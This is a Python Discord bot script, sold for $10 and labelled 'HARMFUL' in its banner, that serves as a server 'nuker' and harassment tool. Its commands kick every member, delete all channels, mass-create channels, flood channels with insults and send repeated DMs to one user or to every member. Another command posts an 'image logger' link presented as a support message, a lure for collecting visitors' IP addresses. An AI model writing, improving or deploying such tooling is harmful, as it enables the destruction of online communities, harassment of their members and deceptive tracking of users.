import discord
from discord.ext import commands
import random
import asyncio



print("""
          ╔════════════════╦═════════════╦═════════════╦════════════╦════════════╗
          ║      BOT       ║  PYTHON     ║   REKTER    ║ COMMANDS   ║    MODE    ║
          ╠════════════════╬═════════════╬═════════════╬════════════╬════════════╣
          ║   COST:$10     ║    JNFL     ║     MENU    ║     8      ║   HARMFUL  ║
          ╚════════════════╩═════════════╩═════════════╩════════════╩════════════╝

""")

TOKEN = input("Please enter your bot token: ")

# Ask for the image URL in the terminal
image_url = input("Please enter the image logger URL: ")

intents = discord.Intents.default()
intents.message_content = True
intents.members = True  # Required to fetch members

bot = commands.Bot(command_prefix="!", intents=intents)

# Global variable to control spam loop
spam_active = False

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.command()
@commands.has_permissions(administrator=True)  # Ensures only admins can use this command
async def rm_all(ctx):
    if ctx.author == ctx.guild.owner:
        await ctx.send("Kicking all members...")
        for member in ctx.guild.members:
            if member != ctx.guild.owner and not member.bot:  # Don't kick the owner or bots
                try:
                    await member.kick(reason="Server restart")
                    print(f"Kicked {member.name}")
                except Exception as e:
                    print(f"Failed to kick {member.name}: {e}")
        await ctx.send("All members have been kicked.")
    else:
        await ctx.send("Only the server owner can use this command.")

@bot.command()
async def tgs(ctx):
    commands_list = """
    **Commands:**

    1. !ping (checks if the bot is active)

    2. !rm_all (removes everyone from the discord server)

    3. !spam (spams random messages. say !stop to stop)

    4. !spam_dm @uservoid <text_here> (spam DMs the user, say !stop to stop)

    5. !add_channel <name> <amount> (creates specified number of channels with the given name)

    6. !image (embedded message with the pre-configured image URL)

    7. !rm_channels (Removes all server channels.)
    
    8. !spam_dm_e message (this spams everyone in the server!)
    """
    await ctx.send(commands_list)

@bot.command()
async def ping(ctx):
    await ctx.send("Pong")

@bot.command()
async def spam(ctx):
    global spam_active
    spam_active = True
    messages = ["Get rekted skid", "This server has been rekted", "LOSER!"]
    while spam_active:
        message = random.choice(messages)  # Choose a random message
        await ctx.send(message)
        await asyncio.sleep(1)  # Wait for 1 second before sending the next message

@bot.command()
async def stop(ctx):
    global spam_active
    spam_active = False
    await ctx.send("Spam stopped.")

@bot.command()
async def spam_dm(ctx, user: discord.User, *, message: str):
    # Check if the bot has permission to send DMs
    try:
        await user.send(message)
        await ctx.send(f"Started spamming {user.mention} with the message.")
        global spam_active
        spam_active = True
        
        while spam_active:
            await user.send(message)
            await asyncio.sleep(1)  # Wait for 1 second before sending the next message
            
    except Exception as e:
        await ctx.send(f"Failed to DM {user.mention}: {e}")

@bot.command()
@commands.has_permissions(manage_channels=True)  # Ensure only users with channel management permissions can use this command
async def add_channel(ctx, channel_name: str, amount: int):
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(f'{channel_name}-{i+1}')
            await asyncio.sleep(1)  # Wait 1 second between each channel creation to avoid rate limits
        except Exception as e:
            await ctx.send(f"Failed to create channel {channel_name}-{i+1}: {e}")
            break

    await ctx.send(f"{amount} channels named {channel_name} have been created.")

@bot.command()
async def image(ctx):
    embed = discord.Embed(
        title="Support t.g.s team here!",
        url=image_url
    )
    embed.set_image(url=image_url)
    await ctx.send(embed=embed)
    
@bot.command()
async def rm_channels(ctx):
    await ctx.send("Removing all channels...")
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"Deleted channel {channel.name}")
        except Exception as e:
            print(f"Failed to delete channel {channel.name}: {e}")
    await ctx.send("All channels have been removed.")
    
    
    
@bot.command()
async def spam_dm_e(ctx, *, message: str):
    global spam_active
    spam_active = True

    await ctx.send("Starting to DM everyone in the server. Use `!stop` to stop.")

    members = ctx.guild.members  # Get all members in the server

    # Loop to keep spamming while spam_active is True
    while spam_active:
        for member in members:
            if spam_active and not member.bot:  # Ensure spam is active and skip bots
                try:
                    await member.send(message)  # Send the spam message
                    print(f"Sent DM to {member.name}")
                except Exception as e:
                    print(f"Failed to DM {member.name}: {e}")
                await asyncio.sleep(1)  # Wait 1 second to avoid rate-limiting
        
        # Restart the loop for another round of messages
        if spam_active:
            await ctx.send("Finished one round of DMs. Continuing...")
    
    if not spam_active:
        await ctx.send("Spam stopped.")



    

bot.run(TOKEN)
